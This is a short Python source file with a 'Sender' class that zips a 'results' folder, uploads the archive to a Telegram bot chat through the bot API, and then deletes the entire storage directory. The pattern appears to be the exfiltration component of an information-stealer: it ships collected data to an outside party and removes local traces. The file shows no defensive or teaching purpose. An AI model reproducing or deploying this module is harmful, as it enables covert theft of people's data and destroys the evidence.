import requests
from shutil import make_archive, rmtree


class Sender:

    def __init__(self, user: str, storage_path: str, token: str, user_id: int):

        self.user = user
        self.storage_path = storage_path

        self.token = token
        self.user_id = user_id

    def __create_archive(self):

        make_archive(self.storage_path + f"{self.user}-st", 'zip', self.storage_path + "results")

    def __send_archive(self):

        with open(self.storage_path + f"{self.user}-st.zip", 'rb') as file:

            requests.post(
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data={
                    'chat_id': self.user_id
                },
                files={
                    'document': file
                }
            )

        file.close()

    def __delete_files(self):

        rmtree(self.storage_path)

    def run(self):

        self.__create_archive()
        self.__send_archive()
        self.__delete_files()
